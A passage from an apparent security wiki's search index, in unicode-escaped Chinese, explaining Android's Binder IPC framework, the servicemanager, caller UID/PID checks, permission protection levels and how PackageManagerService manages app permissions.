\u5b83\u63d0\u4f9b\u4e86\u7ba1\u7406\u6b64\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u4e4b\u95f4\u7684\u6240\u6709\u7c7b\u578b\u7684\u901a\u4fe1\u6240\u9700\u7684\u529f\u80fd\u3002 \u57fa\u672c\u4e0a\uff0c\u751a\u81f3\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u719f\u77e5\u7684\u673a\u5236\uff0c\u4f8b\u5982 Intents \u548c ContentProvider \uff0c\u90fd\u5efa\u7acb\u5728 Binder \u6846\u67b6\u4e4b\u4e0a\u3002 \u8fd9\u4e2a\u6846\u67b6\u63d0\u4f9b\u4e86\u591a\u79cd\u529f\u80fd\uff0c\u4f8b\u5982\u53ef\u4ee5\u8c03\u7528\u8fdc\u7a0b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\uff0c\u5c31\u50cf\u672c\u5730\u5bf9\u8c61\u90a3\u6837\uff0c\u4ee5\u53ca\u540c\u6b65\u548c\u5f02\u6b65\u65b9\u6cd5\u8c03\u7528\uff0cLink to Death\uff08\u67d0\u4e2a\u8fdb\u7a0b\u7684 Binder \u7ec8\u6b62\u65f6\u7684\u81ea\u52a8\u901a\u77e5\uff09\uff0c\u8de8\u8fdb\u7a0b\u53d1\u9001\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u80fd\u529b\u7b49\u7b49[12,16]\u3002 \u6839\u636e\u7531\u5ba2\u6237\u7aef - \u670d\u52a1\u5668\u540c\u6b65\u6a21\u578b\u7ec4\u7ec7\u7684\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5ba2\u6237\u7aef\u53d1\u8d77\u8fde\u63a5\u5e76\u7b49\u5f85\u6765\u81ea\u670d\u52a1\u7aef\u7684\u56de\u590d\u3002 \u56e0\u6b64\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u53ef\u4ee5\u88ab\u60f3\u8c61\u4e3a\u5728\u76f8\u540c\u7684\u8fdb\u7a0b\u7ebf\u7a0b\u4e2d\u6267\u884c\u3002 \u8fd9\u4e3a\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u4e86\u8c03\u7528\u8fdc\u7a0b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u7684\u53ef\u80fd\u6027\uff0c\u5c31\u50cf\u5b83\u4eec\u662f\u672c\u5730\u7684\u4e00\u6837\u3002 \u901a\u8fc7 Binder \u7684\u901a\u4fe1\u6a21\u578b\u5982\u56fe 4.1 \u6240\u793a\u3002 \u5728\u8fd9\u4e2a\u56fe\u4e2d\uff0c\u5ba2\u6237\u7aef\u8fdb\u7a0b A \u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u60f3\u8981\u4f7f\u7528\u8fdb\u7a0b B [12]\u4e2d\u8fd0\u884c\u7684\u670d\u52a1\u7684\u516c\u5f00\u884c\u4e3a \u4f7f\u7528 Binder \u6846\u67b6\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u4e4b\u95f4\u7684\u6240\u6709\u901a\u4fe1\uff0c\u90fd\u901a\u8fc7 Linux \u5185\u6838\u9a71\u52a8\u7a0b\u5e8f /dev/binder \u8fdb\u884c\u3002\u6b64\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u7684\u6743\u9650\u8bbe\u7f6e\u4e3a\u5168\u5c40\u53ef\u8bfb\u548c\u53ef\u5199\uff08\u89c1 3.1 \u8282\u4e2d\u7684\u6e05\u5355 3.3\u4e2d\u7684\u7b2c 3 \u884c\uff09\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5199\u5165\u548c\u8bfb\u53d6\u6b64\u8bbe\u5907\u3002\u4e3a\u4e86\u9690\u85cf Binder \u901a\u4fe1\u534f\u8bae\u7684\u7279\u6027\uff0c libbinder \u5e93\u5728 Android \u4e2d\u4f7f\u7528\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u529f\u80fd\uff0c\u4f7f\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u7684\u4ea4\u4e92\u8fc7\u7a0b\u5bf9\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u900f\u660e\u3002\u5c24\u5176\u662f\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u6240\u6709\u901a\u4fe1\u901a\u8fc7\u5ba2\u6237\u7aef\u4fa7\u7684\u4ee3\u7406\u548c\u670d\u52a1\u5668\u4fa7\u7684\u6869\u8fdb\u884c\u3002\u4ee3\u7406\u548c\u6869\u8d1f\u8d23\u7f16\u7801\u548c\u89e3\u7801\u6570\u636e\u548c\u901a\u8fc7 Binder \u9a71\u52a8\u7a0b\u5e8f\u53d1\u9001\u7684\u547d\u4ee4\u3002\u4e3a\u4e86\u4f7f\u7528\u4ee3\u7406\u548c\u6869\uff0c\u5f00\u53d1\u4eba\u5458\u53ea\u9700\u5b9a\u4e49\u4e00\u4e2a AIDL \u63a5\u53e3\uff0c\u5728\u7f16\u8bd1\u5e94\u7528\u7a0b\u5e8f\u671f\u95f4\u5c06\u5176\u8f6c\u6362\u4e3a\u4ee3\u7406\u548c\u6869\u3002\u5728\u670d\u52a1\u7aef\uff0c\u8c03\u7528\u5355\u72ec\u7684 Binder \u7ebf\u7a0b\u6765\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002 \u4ece\u6280\u672f\u4e0a\u8bb2\uff0c\u4f7f\u7528Binder\u673a\u5236\u7684\u6bcf\u4e2a\u516c\u5f00\u670d\u52a1\uff08\u6709\u65f6\u79f0\u4e3a Binder \u670d\u52a1\uff09\u90fd\u5206\u914d\u6709\u6807\u8bc6\u3002\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u786e\u4fdd\u6b64 32 \u4f4d\u503c\u5728\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u8fdb\u7a0b\u4e2d\u662f\u552f\u4e00\u7684\u3002\u56e0\u6b64\uff0c\u6b64\u6807\u8bc6\u7528\u4f5c Binder \u670d\u52a1\u7684\u53e5\u67c4\u3002\u62e5\u6709\u6b64\u53e5\u67c4\u53ef\u4ee5\u4e0e\u670d\u52a1\u4ea4\u4e92\u3002\u7136\u800c\uff0c\u4e3a\u4e86\u5f00\u59cb\u4f7f\u7528\u670d\u52a1\uff0c\u5ba2\u6237\u7aef\u9996\u5148\u5fc5\u987b\u627e\u5230\u8fd9\u4e2a\u503c\u3002\u670d\u52a1\u53e5\u67c4\u7684\u53d1\u73b0\u901a\u8fc7 Binder \u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff08 servicemanager \u662f Android Binder \u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u7684\u5b9e\u73b0\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u4e92\u6362\u4f7f\u7528\u8fd9\u4e9b\u6982\u5ff5\uff09\u6765\u5b8c\u6210\u3002\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u662f\u4e00\u4e2a\u7279\u6b8a\u7684Binder \u670d\u52a1\uff0c\u5176\u9884\u5b9a\u4e49\u7684\u53e5\u67c4\u503c\u7b49\u4e8e 0\uff08\u6307\u4ee3\u6e05\u5355 4.1 \u7684\u7b2c 8 \u884c\u4e2d\u83b7\u5f97\u7684\u4e1c\u897f\uff09\u3002\u56e0\u4e3a\u5b83\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u53e5\u67c4\u503c\uff0c\u4efb\u4f55\u4e00\u65b9\u90fd\u53ef\u4ee5\u627e\u5230\u5b83\u5e76\u8c03\u7528\u5176\u65b9\u6cd5\u3002\u57fa\u672c\u4e0a\uff0c\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u5145\u5f53\u540d\u79f0\u670d\u52a1\uff0c\u901a\u8fc7\u670d\u52a1\u7684\u540d\u79f0\u63d0\u4f9b\u670d\u52a1\u53e5\u67c4\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\uff0c\u6bcf\u4e2a\u670d\u52a1\u5fc5\u987b\u6ce8\u518c\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff08\u4f8b\u5982\uff0c\u4f7f\u7528\u7b2c 26 \u884c\u4e2d\u7684 ServiceManager \u7c7b\u7684 addService \u65b9\u6cd5\uff09\u3002\u56e0\u6b64\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u4ec5\u77e5\u9053\u4e0e\u5176\u901a\u4fe1\u7684\u670d\u52a1\u540d\u79f0\u3002\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u6765\u89e3\u6790\u6b64\u540d\u79f0\uff08\u8bf7\u53c2\u9605 getService \u7b2c 12 \u884c\uff09\uff0c\u5ba2\u6237\u7aef\u5c06\u6536\u5230\u7a0d\u540e\u7528\u4e8e\u4e0e\u670d\u52a1\u4ea4\u4e92\u7684\u6807\u8bc6\u3002 Binder \u9a71\u52a8\u7a0b\u5e8f\u53ea\u5141\u8bb8\u6ce8\u518c\u5355\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\u3002\u56e0\u6b64\uff0c servicemanager \u662f\u7531 Android \u542f\u52a8\u7684\u7b2c\u4e00\u4e2a\u670d\u52a1\u4e4b\u4e00\uff08\u89c1\u7b2c 3.1\u8282\uff09\u3002 servicemanager \u7ec4\u4ef6\u786e\u4fdd\u4e86\u53ea\u5141\u8bb8\u7279\u6743\u7cfb\u7edf\u6807\u8bc6\u6ce8\u518c\u670d\u52a1\u3002 Binder \u6846\u67b6\u672c\u8eab\u4e0d\u5b9e\u65bd\u4efb\u4f55\u5b89\u5168\u6027\u3002 \u540c\u65f6\uff0c\u5b83\u63d0\u4f9b\u4e86\u5728 Android \u4e2d\u5b9e\u65bd\u5b89\u5168\u6027\u7684\u8bbe\u65bd\u3002Binder \u9a71\u52a8\u7a0b\u5e8f\u5c06\u53d1\u9001\u8005\u8fdb\u7a0b\u7684 UID \u548c PID \u6dfb\u52a0\u5230\u6bcf\u4e2a\u4e8b\u52a1\u3002 \u56e0\u6b64\uff0c\u7531\u4e8e\u7cfb\u7edf\u4e2d\u7684\u6bcf\u4e2a\u5e94\u7528\u5177\u6709\u5176\u81ea\u5df1\u7684 UID\uff0c\u6240\u4ee5\u8be5\u503c\u53ef\u4ee5\u7528\u4e8e\u8bc6\u522b\u8c03\u7528\u65b9\u3002 \u8c03\u7528\u7684\u63a5\u6536\u8005\u53ef\u4ee5\u68c0\u67e5\u6240\u83b7\u5f97\u7684\u503c\u5e76\u4e14\u51b3\u5b9a\u662f\u5426\u5e94\u8be5\u5b8c\u6210\u4e8b\u52a1\u3002 \u63a5\u6536\u8005\u53ef\u4ee5\u8c03\u7528android.os.Binder.getCallingUid() \u548c android.os.Binder.getCallingPid() [12]\u6765\u83b7\u5f97\u53d1\u9001\u8005\u7684 UID \u548c PID\u3002 \u53e6\u5916\uff0c\u7531\u4e8e Binder \u53e5\u67c4\u5728\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684\u552f\u4e00\u6027\u548c\u5176\u503c\u7684\u6a21\u7cca\u6027[14]\uff0c\u5b83\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5b89\u5168\u6807\u8bc6","title":"4.1 Android Binder \u6846\u67b6"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#42-android","text":"\u5982\u6211\u4eec\u5728 2.1 \u8282\u4e2d\u6240\u8bbe\u8ba1\u7684\u90a3\u6837\uff0c\u5728 Android \u4e2d\uff0c\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u9ed8\u8ba4\u83b7\u5f97\u5176\u81ea\u5df1\u7684 UID \u548cGID \u7cfb\u7edf\u6807\u8bc6\u3002 \u6b64\u5916\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd8\u6709\u4e00\u4e9b\u786c\u7f16\u7801\u7684\u6807\u8bc6\uff08\u53c2\u89c1\u6e05\u5355 3.5\uff09\u3002 \u8fd9\u4e9b\u8eab\u4efd\u7528\u4e8e\u4f7f\u7528\u5728 Linux \u5185\u6838\u7ea7\u522b\u4e0a\u5b9e\u65bd\u7684 DAC\uff0c\u5206\u79bb Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u7ec4\u4ef6\uff0c\u4ece\u800c\u63d0\u9ad8\u64cd\u4f5c\u7cfb\u7edf\u7684\u6574\u4f53\u5b89\u5168\u6027\u3002 \u5728\u8fd9\u4e9b\u8eab\u4efd\u4e2d\uff0c AID SYSTEM \u6700\u4e3a\u663e\u8457\u3002 \u6b64 UID \u7528\u4e8e\u8fd0\u884c\u7cfb\u7edf\u670d\u52a1\u5668\uff08 system server \uff09\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u7edf\u4e00\u4e86\u7531 Android \u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u670d\u52a1\u3002 \u7cfb\u7edf\u670d\u52a1\u5668\u5177\u6709\u8bbf\u95ee\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\uff0c\u4ee5\u53ca\u5728\u7cfb\u7edf\u670d\u52a1\u5668\u5185\u8fd0\u884c\u7684\u6bcf\u4e2a\u670d\u52a1\u7684\u7279\u6743\uff0c\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u5bf9\u5176\u4ed6 OS \u7ec4\u4ef6\u548c\u5e94\u7528\u7684\u7279\u5b9a\u529f\u80fd\u7684\u53d7\u63a7\u8bbf\u95ee\u3002 \u6b64\u53d7\u63a7\u8bbf\u95ee\u57fa\u4e8e\u6743\u9650\u7cfb\u7edf\u3002 \u6b63\u5982\u6211\u4eec\u5728 4.1 \u8282\u4e2d\u6240\u63d0\u53ca\u7684\uff0cBinder \u6846\u67b6\u5411\u63a5\u6536\u65b9\u63d0\u4f9b\u4e86\u83b7\u5f97\u53d1\u9001\u65b9 UID \u548c PID \u7684\u80fd\u529b\u3002 \u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8be5\u529f\u80fd\u53ef\u4ee5\u7531\u670d\u52a1\u5229\u7528\u6765\u9650\u5236\u60f3\u8981\u8fde\u63a5\u5230\u670d\u52a1\u7684\u6d88\u8d39\u8005\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5c06\u6d88\u8d39\u8005\u7684 UID \u548c PID \u4e0e\u670d\u52a1\u6240\u5141\u8bb8\u7684 UID \u5217\u8868\u8fdb\u884c\u6bd4\u8f83\u6765\u5b9e\u73b0\u3002\u7136\u800c\uff0c\u5728 Android \u4e2d\uff0c\u8fd9\u79cd\u529f\u80fd\u4ee5\u7565\u5fae\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u3002\u670d\u52a1\u7684\u6bcf\u4e2a\u5173\u952e\u529f\u80fd\uff08\u6216\u7b80\u5355\u6765\u8bf4\u662f\u670d\u52a1\u7684\u65b9\u6cd5\uff09\u88ab\u79f0\u4e3a\u6743\u9650\u7684\u7279\u6b8a\u6807\u7b7e\u4fdd\u62a4\u3002\u7c97\u7565\u5730\u8bf4\uff0c\u5728\u6267\u884c\u8fd9\u6837\u7684\u65b9\u6cd5\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u8c03\u7528\u8fdb\u7a0b\u662f\u5426\u88ab\u5206\u914d\u4e86\u6743\u9650\u3002\u5982\u679c\u8c03\u7528\u8fdb\u7a0b\u5177\u6709\u6240\u9700\u6743\u9650\uff0c\u5219\u5141\u8bb8\u8c03\u7528\u670d\u52a1\u3002\u5426\u5219\uff0c\u5c06\u629b\u51fa\u5b89\u5168\u68c0\u67e5\u5f02\u5e38\uff08\u901a\u5e38\uff0c SecurityException \uff09\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5f00\u53d1\u8005\u60f3\u8981\u5411\u5176\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u53d1\u9001\u77ed\u4fe1\u7684\u529f\u80fd\uff0c\u5219\u5fc5\u987b\u5c06\u4ee5\u4e0b\u884c\u6dfb\u52a0\u5230\u5e94\u7528\u7a0b\u5e8f\u7684 AndroidManifest.xml \u6587\u4ef6 \u4e2d\uff1a \u3002Android \u8fd8\u63d0\u4f9b\u4e86\u4e00\u7ec4\u7279\u6b8a\u8c03\u7528\uff0c\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u68c0\u67e5\u670d\u52a1\u4f7f\u7528\u8005\u662f\u5426\u5df2\u5206\u914d\u6743\u9650\u3002 \u5230\u76ee\u524d\u4e3a\u6b62\u6240\u63cf\u8ff0\u7684\u6743\u9650\u6a21\u578b\u63d0\u4f9b\u4e86\u4e00\u79cd\u5f3a\u5316\u5b89\u5168\u6027\u7684\u6709\u6548\u65b9\u6cd5\u3002 \u540c\u65f6\uff0c\u8fd9\u4e2a\u6a21\u578b\u662f\u65e0\u6548\u7684\uff0c\u56e0\u4e3a\u5b83\u8ba4\u4e3a\u6240\u6709\u7684\u6743\u9650\u662f\u76f8\u7b49\u7684\u3002 \u5728\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b\uff0c\u6240\u63d0\u4f9b\u7684\u529f\u80fd\u5728\u5b89\u5168\u610f\u4e49\u4e0a\u5e76\u4e0d\u603b\u662f\u76f8\u7b49\u3002 \u4f8b\u5982\uff0c\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u529f\u80fd\u6bd4\u53d1\u9001 SMS \u7684\u529f\u80fd\u66f4\u91cd\u8981\uff0c\u76f8\u53cd\uff0c\u53d1\u9001 SMS\u7684\u529f\u80fd\u6bd4\u8bbe\u7f6e\u8b66\u544a\u6216\u632f\u52a8\u66f4\u5371\u9669\u3002 \u8fd9\u4e2a\u95ee\u9898\u5728 Android \u4e2d\u901a\u8fc7\u5f15\u5165\u6743\u9650\u7684\u5b89\u5168\u7ea7\u522b\u6765\u89e3\u51b3\u3002\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u6743\u9650\u7ea7 \u522b\uff1a normal \uff0c dangerous \uff0c signature \u548c signatureOrSystem \u3002\u6743\u9650\u7ea7\u522b\u8981\u4e48\u786c\u7f16\u7801\u5230 Android \u64cd\u4f5c\u7cfb\u7edf\uff08\u5bf9\u4e8e\u7cfb\u7edf\u6743\u9650\uff09\uff0c\u8981\u4e48\u7531\u81ea\u5b9a\u4e49\u6743\u9650\u58f0\u660e\u4e2d\u7684\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u5206 \u914d\u3002\u6b64\u7ea7\u522b\u5f71\u54cd\u662f\u5426\u51b3\u5b9a\u5411\u8bf7\u6c42\u7684\u5e94\u7528\u7a0b\u5e8f\u6388\u4e88\u6743\u9650\u3002\u4e3a\u4e86\u88ab\u6388\u4e88\u6743\u9650\uff0c\u6b63\u5e38\u7684\u6743\u9650\u53ef\u4ee5\u53ea \u5728\u5e94\u7528\u7a0b\u5e8f\u7684 AndroidManifest.xml \u6587\u4ef6\u4e2d\u8bf7\u6c42\u3002\u5371\u9669\u6743\u9650\u9664\u4e86\u5728\u6e05\u5355\u6587\u4ef6\u4e2d\u8bf7\u6c42\u4e4b\u5916\uff0c\u8fd8\u5fc5 \u987b\u7531\u7528\u6237\u6279\u51c6\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u671f\u95f4\uff0c\u5b89\u88c5\u5305\u6240\u8bf7\u6c42\u7684\u6743\u9650\u96c6\u4f1a\u663e\u793a\u7ed9\u7528\u6237\u3002 \u5982\u679c\u7528\u6237\u6279\u51c6\u5b83\u4eec\uff0c\u5219\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u3002\u5426\u5219\uff0c\u5b89\u88c5\u5c06\u88ab\u53d6\u6d88\u3002\u5982\u679c\u8bf7\u6c42\u6743\u9650\u7684\u5e94\u7528\u4e0e\u58f0\u660e\u5b83 \u7684\u5e94\u7528\u62e5\u6709\u76f8\u540c\u7b7e\u540d\uff0c\uff086.1 \u4e2d\u63d0\u5230\u4e86 Android \u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u7684\u7528\u6cd5\uff09\uff0c\u7cfb\u7edf\u5c06\u6388 \u4e88 signature \u6743\u9650\u3002\u5982\u679c\u8bf7\u6c42\u7684\u6743\u9650\u5e94\u7528\u548c\u58f0\u660e\u6743\u9650\u7684\u4f7f\u7528\u76f8\u540c\u8bc1\u4e66\u7b7e\u540d\uff0c\u6216\u8bf7\u6c42\u5e94\u7528\u4f4d\u4e8e \u7cfb\u7edf\u6620\u50cf\u4e0a\uff0c\u5219\u6388\u4e88 signatureOrSystem \u6743\u9650\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u6211\u4eec\u7684\u793a\u4f8b\uff0c\u632f\u52a8\u529f\u80fd\u88ab\u6b63\u5e38\u7ea7\u522b \u7684\u6743\u9650\u4fdd\u62a4\uff0c\u53d1\u9001 SMS \u7684\u529f\u80fd\u88ab\u5371\u9669\u7ea7\u522b\u7684\u6743\u9650\u4fdd\u62a4\uff0c\u4ee5\u53ca\u8f6f\u4ef6\u5305\u5b89\u88c5\u529f\u80fd \u88ab signatureOrSystem \u6743\u9650\u7ea7\u522b\u4fdd\u62a4\u3002","title":"4.2 Android \u6743\u9650"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#421","text":"\u7528\u4e8e\u4fdd\u62a4 Android \u64cd\u4f5c\u7cfb\u7edf\u529f\u80fd\u7684\u7cfb\u7edf\u6743\u9650\u5728\u6846\u67b6\u7684 AndroidManifest.xml \u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u4f4d\u4e8e Android \u6e90\u7684 frameworks/base/core/res \u6587\u4ef6\u5939\u4e2d\u3002 \u8fd9\u4e2a\u6587\u4ef6\u7684\u4e00\u4e2a\u6458\u5f55\u5305\u542b\u4e00\u4e9b\u6743\u9650\u5b9a\u4e49\u7684 \u4f8b\u5b50\uff0c\u5982\u4ee3\u7801\u6e05\u5355 4.2 \u6240\u793a\u3002 \u5728\u8fd9\u4e9b\u793a\u4f8b\u4e2d\uff0c\u5c55\u793a\u4e86\u7528\u4e8e\u4fdd\u62a4\u53d1\u9001 SMS\uff0c\u632f\u52a8\u5668\u548c\u5305\u5b89\u88c5\u529f \u80fd\u7684\u6743\u9650\u58f0\u660e\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u8bbf\u95ee\u53d7 signature \u548c signatureOrSystem \u7ea7\u522b\u7684 \u7cfb\u7edf\u6743\u9650\u4fdd\u62a4\u7684\u529f\u80fd\u3002 \u8fd9\u79cd\u884c\u4e3a\u4ee5\u4ee5\u4e0b\u65b9\u5f0f\u6765\u4fdd\u8bc1\uff1a\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5305\u4f7f\u7528\u5e73\u53f0\u8bc1\u4e66\u7b7e\u540d\u3002 \u56e0 \u6b64\uff0c\u9700\u8981\u4f7f\u7528\u8fd9\u4e9b\u7ea7\u522b\u7684\u6743\u9650\u4fdd\u62a4\u7684\u529f\u80fd\u7684\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u4f7f\u7528\u76f8\u540c\u7684\u5e73\u53f0\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002 \u7136 \u800c\uff0c\u4ec5\u6709\u64cd\u4f5c\u7cfb\u7edf\u7684\u6784\u5efa\u8005\u624d\u53ef\u4ee5\u8bbf\u95ee\u8be5\u8bc1\u4e66\u7684\u79c1\u94a5\uff0c\u901a\u5e38\u662f\u786c\u4ef6\u751f\u4ea7\u8005\uff08\u4ed6\u4eec\u81ea\u5df1\u5b9a\u5236 Android\uff09\u6216\u7535\u4fe1\u8fd0\u8425\u5546\uff08\u4f7f\u7528\u5176\u4fee\u6539\u7684\u64cd\u4f5c\u7cfb\u7edf\u6620\u50cf\u6765\u5206\u53d1\u8bbe\u5907\uff09\u3002","title":"4.2.1 \u7cfb\u7edf\u6743\u9650\u5b9a\u4e49"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#422","text":"\u7cfb\u7edf\u670d\u52a1 PackageManagerService \u8d1f\u8d23 Android \u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u3002 \u6b64\u670d\u52a1\u6709\u52a9\u4e8e\u5728\u64cd\u4f5c\u7cfb\u7edf \u4e2d\u5b89\u88c5\uff0c\u5378\u8f7d\u548c\u66f4\u65b0\u5e94\u7528\u7a0b\u5e8f\u3002 \u6b64\u670d\u52a1\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u4f5c\u7528\u662f\u6743\u9650\u7ba1\u7406\u3002 \u57fa\u672c\u4e0a\uff0c\u5b83\u53ef\u4ee5\u88ab\u8ba4 \u4e3a\u662f\u4e00\u4e2a\u7b56\u7565\u7ba1\u7406\u7684\u8981\u7d20\u3002 \u5b83\u5b58\u50a8\u4e86\u7528\u4e8e\u68c0\u67e5 Android \u5305\u662f\u5426\u5206\u914d\u4e86\u7279\u5b9a\u6743\u9650\u7684\u4fe1\u606f\u3002 \u6b64 \u5916\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u548c\u5347\u7ea7\u671f\u95f4\uff0c\u5b83\u6267\u884c\u4e00\u5806\u68c0\u67e5\uff0c\u6765\u786e\u4fdd\u5728\u8fd9\u4e9b\u8fc7\u7a0b\u4e2d\u4e0d\u8fdd\u53cd\u6743\u9650\u6a21\u578b\u7684 \u5b8c\u6574\u6027\u3002 \u6b64\u5916\uff0c\u5b83\u8fd8\u4f5c\u4e3a\u4e00\u4e2a\u7b56\u7565\u5224\u5b9a\u7684\u8981\u7d20\u3002 \u6b64\u670d\u52a1\u7684\u65b9\u6cd5\uff08\u6211\u4eec\u5c06\u5728\u540e\u9762\u5c55\u793a\uff09\u662f\u6743\u9650 \u68c0\u67e5\u94fe\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 \u6211\u4eec\u4e0d\u4f1a\u5728\u8fd9\u91cc\u8003\u8651 PackageManagerService \u7684\u64cd\u4f5c\u3002 \u7136\u800c\uff0c\u611f\u5174 \u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u53c2\u8003[15,19]\u6765\u83b7\u5f97\u5982\u4f55\u6267\u884c\u5e94\u7528\u5b89\u88c5\u7684\u66f4\u591a\u7ec6\u8282\u3002 PackageManagerService \u5c06\u6240\u6709\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684\u6743\u9650\u7684\u76f8\u5173\u4fe1\u606f\u5b58\u50a8 \u5728 /data/system/packages.xml [7]\u4e2d\u3002 \u8be5\u6587\u4ef6\u7528\u4f5c\u7cfb\u7edf\u91cd\u65b0\u542f\u52a8\u4e4b\u95f4\u7684\u6c38\u4e45\u5b58\u50a8\u5668\u3002 \u4f46\u662f\uff0c\u5728 \u8fd0\u884c\u65f6\uff0c\u6240\u6709\u6709\u5173\u6743\u9650\u7684\u4fe1\u606f\u90fd\u4fdd\u5b58\u5728 RAM \u4e2d\uff0c\u4ece\u800c\u63d0\u9ad8\u7cfb\u7edf\u7684\u54cd\u5e94\u901f\u5ea6\u3002 \u5728\u542f\u52a8\u671f\u95f4\uff0c \u6b64\u4fe1\u606f\u4f7f\u7528\u5b58\u50a8\u5728\u7528\u4e8e\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u7684 packages.xml \u6587\u4ef6\u4e2d\u7684\u6570\u636e\uff0c\u4ee5\u53ca\u901a\u8fc7\u89e3\u6790\u7cfb\u7edf\u5e94 \u7528\u7a0b\u5e8f\u6765\u6536\u96c6\u3002","title":"4.2.2 \u6743\u9650\u7ba1\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#423-android","text":"\u4e3a\u4e86\u4e86\u89e3 Android \u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42\u5f3a\u5236\u5b9e\u65bd\u6743\u9650\uff0c\u6211\u4eec\u8003\u8651 Vibrator \u670d\u52a1\u7528\u6cd5\u3002 \u5728\u6e05 \u5355 4.3 \u7684\u7b2c 6 \u884c\u4e2d\uff0c\u5c55\u793a\u4e86\u632f\u52a8\u5668\u670d\u52a1\u5982\u4f55\u4fdd\u62a4\u5176\u65b9\u6cd5 vibrate \u7684\u793a\u4f8b\u3002 \u8fd9\u4e00\u884c\u68c0\u67e5\u4e86\u8c03\u7528 \u7ec4\u4ef6\u662f\u5426\u5206\u914d\u6709\u7531\u5e38\u91cf android.Manifest.permission.VIBRATE \u5b9a\u4e49\u7684\u6807 \u7b7e android.permission.VIBRATE \u3002 Android 